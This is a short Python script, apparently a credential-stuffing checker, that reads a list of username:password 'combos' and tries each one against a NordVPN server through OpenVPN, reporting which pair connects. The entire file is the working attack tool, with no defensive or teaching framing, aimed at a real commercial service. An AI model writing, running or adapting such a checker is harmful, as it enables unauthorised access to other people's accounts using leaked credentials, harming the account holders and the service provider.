import logging
import subprocess
import time

DEBUG = False
INFO = True
log = logging.getLogger('Connector-Logger')  # Creating logger
if INFO:
    log.setLevel(logging.INFO)  # Setting logging level to INFO (default)
if DEBUG:
    log.setLevel(logging.DEBUG)  # Setting logging level to DEBUG
log.addHandler(logging.StreamHandler())  # Adding StreamHandler


class Connector:
    def __init__(self, ovpn_path: str, config_path: str, combos: str, timeout: int):
        self.ovpn_path = ovpn_path
        self.config_path = config_path
        self.combos = combos
        self.timeout = timeout
        log.debug('Loaded with configuration:')
        log.debug(f'OpenVPN path: {self.ovpn_path}')
        log.debug(f'.ovpn config path: {self.config_path}')
        log.debug(f'Combos path: {self.combos}')
        log.debug(f'Timeout: {self.timeout}s')

    def unpack(self):
        with open(self.combos, 'r') as combos:
            self.combolist = combos.readlines()

    def connect(self):
        length = len(self.combolist)
        for i, combo in enumerate(self.combolist):
            log.info(f'Trying #{i+1}/{length}: {combo.strip()}...')
            with open('ovpn/auth.txt', 'w') as auth:
                auth.write(combo.strip().replace(':', '\n', 1))
            ovpn = subprocess.Popen([self.ovpn_path, '--config', self.config_path, '--auth-user-pass', 'ovpn/auth.txt'],
                                    stdout=subprocess.DEVNULL, stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    close_fds=True)

            time.sleep(self.timeout)
            if ovpn.poll() is None:
                log.info(f"\n\n{'-'*25}\nConnected successfully\n{'-'*25}\n\n")
                ovpn.wait()
            else:
                log.info(f'Combo {combo.strip()} didn\'t work.')
        log.info('No working combo found.')


if __name__ == '__main__':
    cn = Connector(ovpn_path='ovpn/openvpn.exe', config_path='ovpn/ch275.nordvpn.com.udp.ovpn', combos='output/out.txt',
                   timeout=30)
    cn.unpack()
    cn.connect()
